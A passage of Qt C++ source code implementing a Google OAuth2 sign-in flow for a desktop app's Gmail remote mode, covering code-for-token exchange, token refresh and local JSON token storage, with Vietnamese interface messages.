    QNetworkAccessManager *mgr = new QNetworkAccessManager(this);

    QUrl url("https://oauth2.googleapis.com/token");
    QNetworkRequest req(url);

    QUrlQuery postData;
    postData.addQueryItem("client_id", clientId);
    postData.addQueryItem("client_secret", clientSecret);
    postData.addQueryItem("code", code);
    postData.addQueryItem("grant_type", "authorization_code");
    postData.addQueryItem("redirect_uri", "urn:ietf:wg:oauth:2.0:oob");

    QByteArray data = postData.toString(QUrl::FullyEncoded).toUtf8();
    req.setHeader(QNetworkRequest::ContentTypeHeader, "application/x-www-form-urlencoded");

    QNetworkReply *reply = mgr->post(req, data);
    connect(reply, &QNetworkReply::finished, this, [=]() {
        if (reply->error() == QNetworkReply::NoError) {
            QJsonDocument json = QJsonDocument::fromJson(reply->readAll());
            QJsonObject obj = json.object();
            googleAccessToken = obj["access_token"].toString();
            googleRefreshToken = obj["refresh_token"].toString();
            QMessageBox::information(this, "Success", "Đăng nhập Gmail thành công\n");
        } else
            QMessageBox::critical(this, "Error", "Lấy access_token thất bại\n" + reply->errorString());

        reply->deleteLater();
        mgr->deleteLater();
    });
}
void MainWindow::loadGoogleCredentials()
{
    QFile credFile("credentials.json");
    if (credFile.open(QIODevice::ReadOnly)) {
        QJsonDocument credDoc = QJsonDocument::fromJson(credFile.readAll());
        QJsonObject installed = credDoc.object()["installed"].toObject();
        googleClientId = installed["client_id"].toString();
        googleClientSecret = installed["client_secret"].toString();
        credFile.close();
    } else {
        QMessageBox::critical(this, "Error", "Không tìm thấy file credentials.json");
    }
}
void MainWindow::chooseRemoteMode()
{
    SelectRemoteDialog dlg(this);
    if (dlg.exec() == QDialog::Accepted) {
        if (dlg.selectedType == SelectRemoteDialog::IP) {
        } else if (dlg.selectedType == SelectRemoteDialog::Gmail) {
            startGmailRemote();
        }
    }
}
QJsonObject MainWindow::loadActiveGmailToken() {
    QFile file("tokens.json");
    if (file.open(QIODevice::ReadOnly)) {
        QJsonDocument doc = QJsonDocument::fromJson(file.readAll());
        if (doc.isObject())
            return doc.object();
        file.close();
    }
    return QJsonObject();
}
void MainWindow::setActiveGmailAccount(const QString& email) {
    QJsonArray allTokens = loadGmailTokens();
    for (const auto& v : allTokens) {
        QJsonObject obj = v.toObject();
        if (obj["email"].toString().trimmed() == email.trimmed()) {
            QFile file("tokens.json");
            if (file.open(QIODevice::WriteOnly | QIODevice::Truncate)) {
                file.write(QJsonDocument(obj).toJson());
                file.close();
            }
            googleAccessToken = obj["access_token"].toString();
            googleRefreshToken = obj["refresh_token"].toString();
            googleExpiresAt     = obj["expires_at"].toString().toLongLong();
            currentGmailEmail   = obj["email"].toString();
            break;
        }
    }
    persistActiveToken();
}
QJsonArray MainWindow::loadGmailTokens() {
    QFile file("tmptokens.json");
    QJsonArray arr;
    if (file.open(QIODevice::ReadOnly)) {
        QJsonDocument doc = QJsonDocument::fromJson(file.readAll());
        if (doc.isArray())
            arr = doc.array();
        file.close();
    }
    return arr;
}
void MainWindow::saveGmailTokens(const QJsonArray& arr) {
    QFile file("tmptokens.json");
    if (file.open(QIODevice::WriteOnly | QIODevice::Truncate)) {
        file.write(QJsonDocument(arr).toJson());
        file.close();
    }
}
QString MainWindow::getGmailAddressFromToken(const QString& accessToken)
{
    QNetworkRequest req = makeAuthRequest(QUrl("https://www.googleapis.com/oauth2/v3/userinfo"));

    QNetworkAccessManager nm;
    QEventLoop loop;
    QNetworkReply *reply = nm.get(req);
    QObject::connect(reply, &QNetworkReply::finished, &loop, &QEventLoop::quit);
    loop.exec();

    QString email;
    if (reply->error() == QNetworkReply::NoError) {
        QJsonDocument doc = QJsonDocument::fromJson(reply->readAll());
        QJsonObject obj = doc.object();
        email = obj.value("email").toString();
    }
    reply->deleteLater();
    return email;
}
void MainWindow::getAccessTokenAndSave(const QString& clientId, const QString& clientSecret, const QString& code)
{
    QNetworkAccessManager *mgr = new QNetworkAccessManager(this);
    QUrl url("https://oauth2.googleapis.com/token");
    QNetworkRequest req(url);

    QUrlQuery postData;
    postData.addQueryItem("client_id", clientId);
    postData.addQueryItem("client_secret", clientSecret);
    postData.addQueryItem("code", code);
    postData.addQueryItem("grant_type", "authorization_code");
    postData.addQueryItem("redirect_uri", "urn:ietf:wg:oauth:2.0:oob");

    QByteArray data = postData.toString(QUrl::FullyEncoded).toUtf8();
    req.setHeader(QNetworkRequest::ContentTypeHeader, "application/x-www-form-urlencoded");

    QNetworkReply *reply = mgr->post(req, data);
    connect(reply, &QNetworkReply::finished, this, [=]() {
        if (reply->error() == QNetworkReply::NoError) {
            QJsonDocument json = QJsonDocument::fromJson(reply->readAll());
            QJsonObject obj = json.object();
            QString accessToken = obj["access_token"].toString();
            QString refreshToken = obj["refresh_token"].toString();
            int expires = obj["expires_in"].toInt();
            qint64 expiresAt = QDateTime::currentSecsSinceEpoch() + expires;
            QString userEmail = getGmailAddressFromToken(accessToken).trimmed();

            if (userEmail.isEmpty())
                userEmail = QInputDialog::getText(this, "Gmail", "Email tài khoản này:").trimmed();

            QJsonArray tokens = loadGmailTokens();
            QJsonObject newEntry {
                {"email", userEmail},
                {"access_token", accessToken},
                {"refresh_token", refreshToken},
                {"expires_at", expiresAt}
            };
            googleExpiresAt = expiresAt;
            currentGmailEmail = userEmail;
            QJsonArray newArr;
            for (auto v : tokens)
                if (v.toObject()["email"].toString().trimmed() != userEmail)
                    newArr.append(v);
            newArr.append(newEntry);
            saveGmailTokens(newArr);

            setActiveGmailAccount(userEmail);

            googleAccessToken = accessToken;
            googleRefreshToken = refreshToken;
            QMessageBox::information(this, "Success", "Đã lưu tài khoản Gmail: " + userEmail);
            if (currentGmailDialog) currentGmailDialog->reloadList();
        } else {
            QMessageBox::critical(this, "Error", "Lấy access_token thất bại\n" + reply->errorString());
        }
        reply->deleteLater();
        mgr->deleteLater();
    });
}
void MainWindow::startGmailRemote() {
    while (true) {
        GmailAccountDialog dlg(this);
        currentGmailDialog = &dlg;
        int res = dlg.exec();
        if (res != QDialog::Accepted) return;
        if (dlg.addNew) {
            loadGoogleCredentials();
            if (googleClientId.isEmpty() || googleClientSecret.isEmpty()) {
                QMessageBox::critical(this, "Lỗi", "Không tìm thấy client id/secret trong credentials.json");
                return;
            }
            QString loginUrl = getOAuthUrl(googleClientId);
            QDesktopServices::openUrl(QUrl(loginUrl));
            bool ok = false;
            QString code = QInputDialog::getText(this, "Authorization", "Token:", QLineEdit::Normal, "", &ok);
            if (!ok || code.isEmpty()) continue;
            getAccessTokenAndSave(googleClientId, googleClientSecret, code);
            continue;
        } else if (!dlg.selectedEmail.isEmpty()) {
            QJsonArray tokens = loadGmailTokens();
            for (const QJsonValue& v : tokens) {
                auto obj = v.toObject();
                if (obj["email"].toString().trimmed() == dlg.selectedEmail.trimmed()) {
                    googleAccessToken = obj["access_token"].toString();
                    googleRefreshToken = obj["refresh_token"].toString();
                    setActiveGmailAccount(dlg.selectedEmail.trimmed());
                    QMessageBox::information(this, "Gmail", "Đã chọn Gmail: " + dlg.selectedEmail.trimmed());
                    return;
                }
            }
        }
    }
}
bool MainWindow::refreshAccessToken()
{
    qint64 now = QDateTime::currentSecsSinceEpoch();
    if (now + kTokenSafeGapSec < googleExpiresAt) return true;
    if (googleRefreshToken.isEmpty()) return false;

    QUrlQuery q;
    q.addQueryItem("client_id",     googleClientId);
    q.addQueryItem("client_secret", googleClientSecret);
    q.addQueryItem("refresh_token", googleRefreshToken);
    q.addQueryItem("grant_type",    "refresh_token");

    QNetworkRequest rq(QUrl("https://oauth2.googleapis.com/token"));
    rq.setHeader(QNetworkRequest::ContentTypeHeader, "application/x-www-form-urlencoded");
    rq.setAttribute(QNetworkRequest::Http2AllowedAttribute, false);

    QNetworkAccessManager nm;  QEventLoop loop;
    auto *rp = nm.post(rq, q.toString(QUrl::FullyEncoded).toUtf8());
    connect(rp,&QNetworkReply::finished,&loop,&QEventLoop::quit);
    loop.exec();

    if (rp->error()!=QNetworkReply::NoError) {
        qWarning() << "[Gmail] refresh failed:" << rp->errorString();
        rp->deleteLater();
        return false;
    }
    QJsonObject obj = QJsonDocument::fromJson(rp->readAll()).object();
    rp->deleteLater();

    googleAccessToken = obj["access_token"].toString();
    googleExpiresAt   = now + obj["expires_in"].toInt(3600);
    persistActiveToken();
    return true;
}
QNetworkRequest MainWindow::makeAuthRequest(const QUrl &url)
{
    if (!refreshAccessToken())
        qWarning() << "[Gmail] cannot refresh access-token!";
    QNetworkRequest rq(url);
    rq.setRawHeader("Authorization","Bearer "+googleAccessToken.toUtf8());
    return rq;
}
void MainWindow::initTokenTimer()
{
    auto *t = new QTimer(this);
    connect(t, &QTimer::timeout, this, [this]{
        refreshAccessToken();
    });
    t->start(50 * 60 * 1000);
}
void MainWindow::persistActiveToken()
{
    QJsonObject active{
        {"email",         currentGmailEmail},
        {"access_token",  googleAccessToken},
        {"refresh_token", googleRefreshToken},
        {"expires_at",    QString::number(googleExpiresAt)}
    };

    QFile f(kActiveFile);
    if (f.open(QIODevice::WriteOnly | QIODevice::Truncate))
        f.write(QJsonDocument(active).toJson(QJsonDocument::Compact));

    QFile listFile(kGmailTokenFile);
    QJsonArray arr;
    if (listFile.open(QIODevice::ReadOnly))
        arr = QJsonDocument::fromJson(listFile.readAll()).array();
    listFile.close();

    bool found = false;
    for (QJsonValueRef v : arr) {
        QJsonObject o = v.toObject();
        if (o["email"].toString() == currentGmailEmail) {
            v = active; found = true; break;
        }
    }
    if (!found) arr.append(active);

    if (listFile.open(QIODevice::WriteOnly | QIODevice::Truncate))
        listFile.write(QJsonDocument(arr).toJson(QJsonDocument::Compact));
}
